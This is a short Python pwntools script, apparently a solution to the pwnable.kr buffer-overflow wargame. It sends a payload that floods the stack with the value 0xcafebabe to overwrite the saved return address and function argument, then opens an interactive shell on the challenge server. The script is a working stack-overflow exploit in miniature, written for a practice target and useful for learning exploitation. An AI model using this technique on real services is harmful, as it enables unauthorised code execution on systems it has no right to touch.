
from pwn import *

exploit = ""
exploit += p32(0xcafebabe) * (32 + 4 + 4 + 4) # Skip buffer, ebp, ret add, argument

with open("exploit.bin", "wb") as f:
    f.write(exploit)


p = remote("pwnable.kr", 9000)
p.send(exploit)
p.interactive()
